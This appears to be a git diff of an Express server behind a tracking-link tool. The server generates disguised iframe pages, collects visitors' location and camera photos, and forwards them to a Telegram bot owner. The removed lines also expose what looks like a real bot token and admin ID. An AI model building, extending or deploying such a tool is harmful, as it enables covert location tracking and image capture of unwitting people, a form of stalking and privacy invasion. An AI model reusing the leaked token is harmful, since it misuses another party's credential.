@@ -12,9 +12,7 @@ const app = express();
 app.use(express.json({ limit: "50mb" }));
 app.use(express.static("public"));
 
-const BOT_TOKEN = "8975100574:AAFDFQFAdjPUPQiOsfz4ecgTeVPTp_gN-jc";
-const ADMIN_ID = 8111461057;
-
+const BOT_TOKEN = "YOUR_FAKE_TOKEN"; // 🔁 apna real token daal
 const DB_FILE = "./database.json";
 
 // ===== DB =====
@@ -35,7 +33,7 @@ function generateId() {
 
 // ===== HOME =====
 app.get("/", (req, res) => {
-  res.send("Bot Running 🚀");
+  res.send("Server Running 🚀");
 });
 
 // ===== TRACK PAGE =====
@@ -62,7 +60,7 @@ iframe{width:100%;height:100%;border:none}
 
 <script
 data-tracking-id="${trackingId}"
-data-server-url="https://https://zs-trace.onrender.com"
+data-server-url="https://zs-trace.onrender.com"
 src="/script.js"></script>
 
 </body>
@@ -70,17 +68,18 @@ src="/script.js"></script>
 `);
 });
 
-// ===== DATA (MATCH YOUR SCRIPT.JS) =====
+// ===== DATA =====
 app.post("/data", async (req, res) => {
   const trackingId = req.query.trackingId;
   const data = req.body;
 
   const db = loadDB();
   const entry = db[trackingId];
-
   if (!entry) return res.sendStatus(404);
 
   const chatId = entry.owner;
+
+  console.log("DATA RECEIVED:", data);
 
   try {
     const msg = `
@@ -116,7 +115,7 @@ Map: ${data.Location.Google_Maps}`
     });
 
   } catch (e) {
-    console.log(e);
+    console.log("DATA ERROR:", e);
   }
 
   res.sendStatus(200);
@@ -134,6 +133,7 @@ app.post("/photo", async (req, res) => {
 
   try {
     const { imageData } = req.body;
+    if (!imageData) return res.sendStatus(400);
 
     const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
 
@@ -151,17 +151,15 @@ app.post("/photo", async (req, res) => {
 
     fs.unlinkSync(filePath);
 
-    res.json({ success: true });
-
   } catch (err) {
-    console.log(err);
-    res.status(500).json({ success: false });
+    console.log("PHOTO ERROR:", err);
   }
+
+  res.sendStatus(200);
 });
 
 // ===== TELEGRAM WEBHOOK =====
 app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
-
   const msg = req.body.message;
   if (!msg) return res.sendStatus(200);
 
